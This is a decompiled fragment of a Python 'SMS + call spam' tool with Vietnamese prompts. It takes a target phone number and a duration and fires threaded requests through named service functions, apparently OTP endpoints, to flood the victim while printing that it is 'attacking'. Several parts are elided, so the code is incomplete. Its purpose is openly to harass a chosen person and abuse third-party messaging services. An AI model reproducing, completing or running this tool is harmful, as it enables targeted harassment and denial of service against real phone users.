#Decompile By Nguyen Le Tri Loc ( Vodka Coder )
...
\033[1;34m╚═════════════════════════════════════════════════════════════════╝
\x1b[38;5;46m TOOL SPAM SMS + \x1b[38;5;208mCALL MAX SPEED
\x1b[38;5;46m -----------------------------------------------------------------
"""
def banner():
  os.system("clear")
...
banner()
amount = 5000
sdt = input("\x1b[38;5;46mNhập Số Điện Thoại Cần Spam : \x1b[38;5;208m")
print("\x1b[38;5;46m-----------------------------------------------------------------")
while not re.search("^(0?)(3[2-9]|5[6|8|9]|7[0|6-9]|8[0-6|8|9]|9[0-4|6-9])[0-9]{7}$",sdt):
  print("Số Điện Thoại Phải Đủ 10 Số !!")
  sdt = input("\x1b[38;5;46m Nhập Số Điện Thoại Cần Spam : \x1b[38;5;208m")
count = int(input("\x1b[38;5;46mNhập Thời Gian Spam : \x1b[38;5;208m"))
if sdt == "0123456789":
...
def run(sdt,i):                  
  ...
  threading.submit(KILO,sdt)
  threading.submit(GAPO,sdt) 
  print("\x1b[38;5;46m[🍁HDT - TOOL🍁] \x1b[38;5;208mĐang Tấn Công\x1b[38;5;46m Trạng Thái : \x1b[38;5;208mThành Công ",)  
  for j in range(0, 5):
    # code trong vòng lặp
    print(f"\x1b[38;5;46mĐang Chạy \r",end="")
